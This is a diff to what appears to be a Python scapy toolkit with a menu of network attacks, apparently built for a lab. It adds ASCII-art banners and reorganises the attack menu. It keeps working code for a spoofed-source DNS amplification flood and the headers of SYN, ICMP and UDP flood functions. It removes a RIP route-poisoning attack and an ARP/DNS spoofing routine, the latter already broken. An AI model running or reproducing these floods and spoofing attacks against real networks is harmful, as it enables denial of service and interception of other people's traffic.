@@ -8,21 +8,17 @@ from tqdm import tqdm
 #from netfilterqueue import NetfilterQueue
 import requests
 
-def dns_amplification():
-    
-        print("Insert the target IP address: ")
-        target = input()
-    
-        dns = "198.162.222.1" #DNS server
-    
-        try:
-            while True:
-                packet = IP(src=target, dst=dns) / UDP(sport=RandShort(), dport=53) / DNS(rd=1, qd=DNSQR(qname="google.com", qtype=255))
-                send(packet, loop=1, inter=0.000001)
-        except KeyboardInterrupt as e:
-            sys.exit(1)
-
+#RECONNAISSANCE ATTACKS
 def os_detection():
+    string = '''\
+ ____  ____    ____  _____ _____  _____ ____  _____  _  ____  _     
+/  _ \/ ___\  /  _ \/  __//__ __\/  __//   _\/__ __\/ \/  _ \/ \  /|
+| / \||    \  | | \||  \    / \  |  \  |  /    / \  | || / \|| |\ ||
+| \_/|\___ |  | |_/||  /_   | |  |  /_ |  \_   | |  | || \_/|| | \||
+\____/\____/  \____/\____\  \_/  \____\\____/  \_/  \_/\____/\_/  \|
+'''
+
+    print(string)
     print("Insert target IP address: ")
     target = input()
     packet = IP(dst = target) / TCP(flags = "")
@@ -49,7 +45,15 @@ def os_detection():
     input()
 
 def port_scanner():
+    string = '''\
+ ____  ____  ____  _____    ____  ____  ____  _      _      _____ ____ 
+/  __\/  _ \/  __\/__ __\  / ___\/   _\/  _ \/ \  /|/ \  /|/  __//  __\
+|  \/|| / \||  \/|  / \    |    \|  /  | / \|| |\ ||| |\ |||  \  |  \/|
+|  __/| \_/||    /  | |    \___ ||  \__| |-||| | \||| | \|||  /_ |    /
+\_/   \____/\_/\_\  \_/    \____/\____/\_/ \|\_/  \|\_/  \|\____\\_/\_\
+'''
 
+    print(string)
     print("Insert target IP address: ")
     target = input()
 
@@ -73,6 +77,15 @@ def port_scanner():
     input()
 
 def ip_sweep():
+    string = '''\
+ ____  ____  _____  _  _     _____   _     ____  ____  _____  ____    _  _        _      _____ _____  _      ____  ____  _  __
+/  _ \/   _\/__ __\/ \/ \ |\/  __/  / \ /|/  _ \/ ___\/__ __\/ ___\  / \/ \  /|  / \  /|/  __//__ __\/ \  /|/  _ \/  __\/ |/ /
+| / \||  /    / \  | || | //|  \    | |_||| / \||    \  / \  |    \  | || |\ ||  | |\ |||  \    / \  | |  ||| / \||  \/||   / 
+| |-|||  \_   | |  | || \// |  /_   | | ||| \_/|\___ |  | |  \___ |  | || | \||  | | \|||  /_   | |  | |/\||| \_/||    /|   \ 
+\_/ \|\____/  \_/  \_/\__/  \____\  \_/ \|\____/\____/  \_/  \____/  \_/\_/  \|  \_/  \|\____\  \_/  \_/  \|\____/\_/\_\\_|\_\
+'''
+
+    print(string)
 
     # Defines network to analyze
     print("Insert the network address to scan (The format should be xxx.xxx.xxx.xxx/xx):")
@@ -95,6 +108,15 @@ def ip_sweep():
     input()
 
 def ip_spoof():
+    string = '''\
+ _  ____    ____  ____  ____  ____  _____   _____  _____ ____  _____  _  _      _____
+/ \/  __\  / ___\/  __\/  _ \/  _ \/    /  /__ __\/  __// ___\/__ __\/ \/ \  /|/  __/
+| ||  \/|  |    \|  \/|| / \|| / \||  __\    / \  |  \  |    \  / \  | || |\ ||| |  _
+| ||  __/  \___ ||  __/| \_/|| \_/|| |       | |  |  /_ \___ |  | |  | || | \||| |_//
+\_/\_/     \____/\_/   \____/\____/\_/       \_/  \____\\____/  \_/  \_/\_/  \|\____\
+'''
+
+    print(string)
     # Simple version
     print("Insert target IP address: ")
     target = input()
@@ -113,7 +135,17 @@ def ip_spoof():
     print("Click enter to continue...")
     input()
 
+#DOS ATTACKS
 def syn_flood():
+    string = '''\
+ ____ ___  _ _        _____ _     ____  ____  ____ 
+/ ___\\  \/// \  /|  /    // \   /  _ \/  _ \/  _ \
+|    \ \  / | |\ ||  |  __\| |   | / \|| / \|| | \|
+\___ | / /  | | \||  | |   | |_/\| \_/|| \_/|| |_/|
+\____//_/   \_/  \|  \_/   \____/\____/\____/\____/
+'''
+
+    print(string)
     print("Insert target IP address: ")
     target = input()
     print("Attacking " + target + " with SYN flood.")
@@ -135,6 +167,15 @@ def syn_flood():
     t4.start()
 
 def spoofed_syn_flood():
+    string = '''\
+ ____  ____  ____  ____  _____ _____ ____    ____ ___  _ _        _____ _     ____  ____  ____ 
+/ ___\/  __\/  _ \/  _ \/    //  __//  _ \  / ___\\  \/// \  /|  /    // \   /  _ \/  _ \/  _ \
+|    \|  \/|| / \|| / \||  __\|  \  | | \|  |    \ \  / | |\ ||  |  __\| |   | / \|| / \|| | \|
+\___ ||  __/| \_/|| \_/|| |   |  /_ | |_/|  \___ | / /  | | \||  | |   | |_/\| \_/|| \_/|| |_/|
+\____/\_/   \____/\____/\_/   \____\\____/  \____//_/   \_/  \|  \_/   \____/\____/\____/\____/
+'''
+
+    print(string)
     print("Insert target IP address: ")
     target = input()
     print("Attacking " + target + " with SPOOFED SYN flood.")
@@ -161,7 +202,15 @@ def spoofed_syn_flood():
     t4.start()
 
 def icmp_flood():
-    
+    string = '''\
+ _  ____  _      ____    _____ _     ____  ____  ____ 
+/ \/   _\/ \__/|/  __\  /    // \   /  _ \/  _ \/  _ \
+| ||  /  | |\/|||  \/|  |  __\| |   | / \|| / \|| | \|
+| ||  \__| |  |||  __/  | |   | |_/\| \_/|| \_/|| |_/|
+\_/\____/\_/  \|\_/     \_/   \____/\____/\____/\____/
+'''
+
+    print(string)
     print("Insert target IP address: ")
     target = input()    
     print("Attacking " + target + " with ICMP flood.")
@@ -182,6 +231,15 @@ def icmp_flood():
     t4.start()
 
 def spoofed_icmp_flood():
+    string = '''\
+ ____  ____  ____  ____  _____ _____ ____    _  ____  _      ____    _____ _     ____  ____  ____ 
+/ ___\/  __\/  _ \/  _ \/    //  __//  _ \  / \/   _\/ \__/|/  __\  /    // \   /  _ \/  _ \/  _ \
+|    \|  \/|| / \|| / \||  __\|  \  | | \|  | ||  /  | |\/|||  \/|  |  __\| |   | / \|| / \|| | \|
+\___ ||  __/| \_/|| \_/|| |   |  /_ | |_/|  | ||  \__| |  |||  __/  | |   | |_/\| \_/|| \_/|| |_/|
+\____/\_/   \____/\____/\_/   \____\\____/  \_/\____/\_/  \|\_/     \_/   \____/\____/\____/\____/
+'''
+
+    print(string)
     print("Insert target IP address: ")
     target = input()
     print("Attacking " + target + " with ICMP flood.")
@@ -209,7 +267,15 @@ def spoofed_icmp_flood():
     t4.start()
 
 def spoofed_udp_flood():
+    string = '''\
+ ____  ____  ____  ____  _____ _____ ____    _     ____  ____    _____ _     ____  ____  ____ 
+/ ___\/  __\/  _ \/  _ \/    //  __//  _ \  / \ /\/  _ \/  __\  /    // \   /  _ \/  _ \/  _ \
+|    \|  \/|| / \|| / \||  __\|  \  | | \|  | | ||| | \||  \/|  |  __\| |   | / \|| / \|| | \|
+\___ ||  __/| \_/|| \_/|| |   |  /_ | |_/|  | \_/|| |_/||  __/  | |   | |_/\| \_/|| \_/|| |_/|
+\____/\_/   \____/\____/\_/   \____\\____/  \____/\____/\_/     \_/   \____/\____/\____/\____/
+'''
 
+    print(string)
     print("Insert target IP address: ")
     target = input()
 
@@ -239,7 +305,15 @@ def spoofed_udp_flood():
 
 
 def ping_of_death():
-    
+    string = '''\
+ ____  _  _      _____   ____  _____   ____  _____ ____  _____  _    
+/  __\/ \/ \  /|/  __/  /  _ \/    /  /  _ \/  __//  _ \/__ __\/ \ /|
+|  \/|| || |\ ||| |  _  | / \||  __\  | | \||  \  | / \|  / \  | |_||
+|  __/| || | \||| |_//  | \_/|| |     | |_/||  /_ | |-||  | |  | | ||
+\_/   \_/\_/  \|\____\  \____/\_/     \____/\____\\_/ \|  \_/  \_/ \|
+'''
+
+    print(string)
     print("Insert target IP address: ")
     target = input()
 
@@ -250,105 +324,28 @@ def ping_of_death():
     except KeyboardInterrupt as e:
         sys.exit(1)
 
+#EXPLOITS ATTACKS
+def dns_amplification():
+    string = '''\
+ ____  _      ____    ____  _      ____  _     _  _____ _  ____  ____  _____  _  ____  _     
+/  _ \/ \  /|/ ___\  /  _ \/ \__/|/  __\/ \   / \/    // \/   _\/  _ \/__ __\/ \/  _ \/ \  /|
+| | \|| |\ |||    \  | / \|| |\/|||  \/|| |   | ||  __\| ||  /  | / \|  / \  | || / \|| |\ ||
+| |_/|| | \||\___ |  | |-||| |  |||  __/| |_/\| || |   | ||  \_ | |-||  | |  | || \_/|| | \||
+\____/\_/  \|\____/  \_/ \|\_/  \|\_/   \____/\_/\_/   \_/\____/\_/ \|  \_/  \_/\____/\_/  \|
+'''
 
-#how to create this attack: we want to prevent the Kali Client host from reaching the internet, so we'd have to scramble the RIP entry for the routers R1, R2, R3, R4 which are the 
-#routers not directly connected to the Kali host. 
-def RIP_attack():
+    print(string)
+    print("Insert the target IP address: ")
+    target = input()
 
-    address = "192.168.220.144" #network to be isolated
-	#define headers
-    IP_header = IP(src="192.168.220.30", dst="224.0.0.9", ttl=1) #multicast address for RIPv2
-    IP_header_2 = IP(src="192.168.220.40", dst="224.0.0.9", ttl=1) #multicast address for RIPv2
-    
-    UDP_header = UDP(sport=520, dport=520)
-    RIP_header = RIP(cmd=2, version=2)
-    RIPEntry_ = RIPEntry(addr=address, mask="255.255.255.240", metric=16)
-    #define the packet
-    packet = IP_header / UDP_header / RIP_header / RIPEntry_
-    packet2 = IP_header_2 / UDP_header / RIP_header / RIPEntry_
+    dns = "198.162.222.1" #DNS server
 
-    #loop the sending
     try:
         while True:
-            send(packet, inter=0.000001)
-            send(packet2, inter=0.000001)
+            packet = IP(src=target, dst=dns) / UDP(sport=RandShort(), dport=53) / DNS(rd=1, qd=DNSQR(qname="google.com", qtype=255))
+            send(packet, loop=1, inter=0.000001)
     except KeyboardInterrupt as e:
         sys.exit(1)
-
-def dns_spoofing():
-    
-    def arp_spoofing():
-
-        def getmac(targetip):
-            arppacket = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
-            targetmac = srp(arppacket, timeout=2, verbose=False)[0][0][1].hwsrc
-            return targetmac
-
-        def spoofedarpcache(targetip, targetmac, sourceip):
-            spoofed = ARP(op=2, pdst=targetip, psrc=sourceip, hwsrc=targetmac)
-            send(spoofed, verbose=False)
-
-        def restorearp(targetip, targetmac, sourceip, sourcemac):
-            packet = ARP(op=2, hwsrc=sourcemac, psrc=sourceip, hwdst=targetmac, pdst=targetip)
-            send(packet, verbose=False)
-            print("ARP Table restored to normal for", targetip)
-
-        print("Insert target ip:")
-        targetip = input()
-
-        print("Insert gateway address:")
-        gatewayip = input()
-
-        targetmac = getmac(targetip)
-        print("Target MAC: ", targetmac)
-
-        gatewaymac = getmac(gatewayip)
-        print("Gateway MAC:", gatewaymac)
-
-        try:
-            print("Sending spoofed ARP responses...")
-            while True:
-                spoofedarpcache(targetip, targetmac, gatewayip)
-                spoofedarpcache(gatewayip, gatewaymac, targetip)
-        except KeyboardInterrupt as e:
-            print("ARP Spoofing stopped.")
-            restorearp(gatewayip, gatewaymac, targetip, targetmac)
-            restorearp(targetip, targetmac, gatewayip, gatewaymac)
-            quit()
-
-    def actual_spoofing():
-
-        dns_hosts={"www.google.com"}
-
-        def process_packet(packet):
-            
-            scapy_packet = IP(packet.get_payload())
-            if scapy_packet.haslayer(DNSRR):
-                print("Before:", scapy_packet.summary())
-                qname = scapy_packet[DNSQR].qname
-                if quame in dns_hosts:
-                    scapy_packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
-                    scapy_packet[DNS].ancount = 1
-
-                    del scapy_packet[IP].len
-                    del scapy_packet[IP].chksum
-                    del scapy_packet[UDP].len
-                    del scapy_packet[UDP].chksum
-                print("After:", scapy_packet.summary())
-                packet.set_payload(bytes(scapy_packet))
-            packet.accept()
-
-        QUEUE_NUM=0
-        #insert the iptables FORWARD rule
-        os.system["iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM)]
-        #instantiate the netfiler queue
-        #queue = NetfilterQueue()
-        try:
-            queue.bind(QUEUE_NUM, process_packet)
-            queue.run()
-        except KeyboardInterrupt as e:
-            os.system("iptables --flush")
-
 
 def sql_injection():
 
@@ -373,8 +370,6 @@ def sql_injection():
 
     time.sleep(5)
     choose_exploit()
-    
-
 
 def choose_recon():
     #clear the screen
@@ -477,30 +472,18 @@ def choose_exploit():
     print("----------------------------------------------")
     print("\n")
     print("Choose an exploit.")
-    print("1. TCP Reverse Shell")
-    print("2. RIP Attack on the LAN access to the Internet")
-    print("3. TCP Reset")
-    print("4. DNS Spoofing")
-    print("5. SQL Injection")
-    print("6. Exit")
+    print("1. DNS Amplification Attack")
+    print("2. SQL Injection")
+    print("3. Exit")
     print("----------------------------------------------")
     choice = input("Enter your choice: ")
     if choice == "1":
-        tcp_reverse_shell()
+        dns_amplification()
         choose_exploit()
     elif choice == "2":
-        RIP_attack()
-        choose_exploit()
-    elif choice == "3":
-        tcp_reset()
-        choose_exploit()
-    elif choice == "4":
-        dns_spoofing()
-        choose_exploit()
-    elif choice == "5":
         sql_injection()
         choose_exploit()
-    elif choice == "6":
+    elif choice == "3":
         print("Back to main menu.")
         os.system("clear")
         main()
